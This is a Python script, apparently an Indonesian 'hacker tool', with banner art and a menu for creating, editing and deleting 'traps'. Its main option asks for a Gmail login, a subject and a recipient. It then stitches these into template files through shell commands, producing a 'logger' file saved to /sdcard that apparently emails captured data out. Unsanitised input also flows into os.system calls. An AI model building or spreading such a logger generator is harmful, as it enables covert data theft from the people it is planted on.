# -*- coding: utf-8 -*-
# coding=utf-8
import socket,struct,os,sys,time,yagmail

def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.1 / 100)

logo = """\x1b[32m

_______             _______
|@|@|@|@|           |@|@|@|@|
|@|@|@|@|   _____   |@|@|@|@|
|@|@|@|@| /\_T_T_/\ |@|@|@|@|
|@|@|@|@||/\ T T /\||@|@|@|@|
 ~/T~~T~||~\/~T~\/~||~T~~T\~
  \|__|_| \(-(O)-)/ |_|__|/    ▄▄▄▄    ██▓     ▒█████   ▒█████  ▓█████▄
  _| _|    \\8_8//    |_ |_    ▓█████▄ ▓██▒    ▒██▒  ██▒▒██▒  ██▒▒██▀ ██▌
|(@)]   /~~[_____]~~\   [(@)|  ▒██▒ ▄██▒██░    ▒██░  ██▒▒██░  ██▒░██   █▌
  ~    (  |       |  )    ~    ▒██░█▀  ▒██░    ▒██   ██░▒██   ██░░▓█▄   ▌
      [~` ]       [ '~]        ░▓█  ▀█▓░██████▒░ ████▓▒░░ ████▓▒░░▒████▓
      |~~|         |~~|        ░▒▓███▀
      |  |         |  |              ++++++++++++++++++++++++++++++++
     _<\/>_       _<\/>_             | Author : Ariel Sandy Permana |
    /_====_\     /_====_\            ++++++++++++++++++++++++++++++++\x1b[00m
"""

logo2 = """\x1b[34m

/~@@~\,
 _______ . _\_\___/\ __ /\___|_|_ . _______
/ ____  |=|      \  <_+>  /      |=|  ____ \
~|    |\|=|======\\______//======|=|/|    |~
 |_   |    \      |      |      /    |    |
  \==-|     \     |  2D  |     /     |----|~~)
  |   |      |    |      |    |      |____/~/
  |   |       \____\____/____/      /    / /
  |   |         {----------}       /____/ /
  |___|        /~~~~~~~~~~~~\     |_/~|_|/
   \_/        [/~~~~~||~~~~~\]     /__|\
   | |         |    ||||    |     (/|[[\)
   [_]        |     |  |     | ▄▄▄       ██ ▄█▀ █    ██  ███▄    █
              |_____|  |_____| ▒████▄     ██▄█▒  ██  ▓██▒ ██ ▀█   █
              (_____)  (_____) ▒██  ▀█▄  ▓███▄░ ▓██  ▒██░▓██  ▀█ ██▒
              |     |  |     | ░██▄▄▄▄██ ▓██ █▄ ▓▓█  ░██░▓██▒  ▐▌██▒
              |     |  |     |  ▓█   ▓██▒▒██▒ █▄▒▒█████▓ ▒██░   ▓██░
              |/~~~\|  |/~~~\|  ▒▒   ▓▒█░▒ ▒▒ ▓▒░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒
              /|___|\  /|___|\    ++++++++++++++++++++++++++++++++
             <_______><_______>   | Author : Ariel Sandy Permana |
                                  ++++++++++++++++++++++++++++++++\x1b[00m
"""
def header():
	os.system('clear')
	slowprint(logo)
	print('MERETAS PARA PERETAS tools by \x1b[32mAriel Sandy Permana')
	print('\x1b[32m1. \x1b[00mBuat Jebakan')
	print('\x1b[32m2. \x1b[00mEdit Jebakan')
	print('\x1b[32m3. \x1b[00mHapus Jebakan')
	print('\x1b[32m4. \x1b[00mRead source code')
	print('\x1b[32m0. \x1b[00mExit')
	print('\x1b[00m')
	main()
	
def main():
	dog=input('\x1b[00mPilih Cuk\x1b[32m > \x1b[33m')
	if dog == '':
		print('\x1b[00mCommand not found\x1b[91m!')
		main()
	elif dog == '1':
		print('\x1b[37mLogin Akun Google Dulu Gan')
		u=input('\x1b[36mMasukan Nama Akun Google: \x1b[33m')
		p=input('\x1b[36mMasukan Password Nya Gan: \x1b[33m')
		s=input('\x1b[36mMasukan Subject Nya Gan : \x1b[33m')
		t=input('\x1b[36mMasukan Email Yang Mau Di Kirim       : \x1b[33m')
		b1=("""'"""+u+"""'"""+""","""+"""'"""+p+"""'"""+""")""")
		b2=("subject="+"""'"""+s+"""'""")
		print('\x1b[33m')
		b3=("""'"""+t+"""'"""+""","""+"subject"+""","""+"body"+""")""")
		b4=("")
		b5=("main"+"""("""+""")""")
		print('Creating logger code, please wait ...')
		os.system('sleep 3')
		os.system('cat log1 > Hasil-Ariel.py;echo "'+b1+'" >> Hasil-Ariel.py;echo "'+b2+'" >> Hasil-Ariel.py;cat log2 >> Hasil-Ariel.py;echo "'+b3+'" >> Hasil-Ariel.py;print "'+b4+'" >> Hasil-Ariel.py;print "'+b5+'" >> Hasil-Ariel.py;cat Hasil-Ariel.py > /sdcard/Hasil-Ariel.py')
		slowprint('\x1b[00mSuccess, file auto saved as \x1b[33m/sdcard/Hasil-Ariel.py')
		os.system('xdg-open https://instagram.com/saydog.official')
	elif dog == '2':
		os.system('nano logger.py')
		main()
	elif dog == '3':
		os.system('rm Hasil-Ariel.py')
		print('\x1b[00mLogger has been removed \x1b[91m!')
		os.system('sleep 3')
		header()
	elif dog == '4':
		os.system('cat Hasil-Ariel.py')
		main()
	elif dog == '0':
		os.system('xdg-open https://youtube.com/Ariel69Channel;exit')
	else:
		print('\x1b[00mCommand not found\x1b[91m!')
		main()

header()
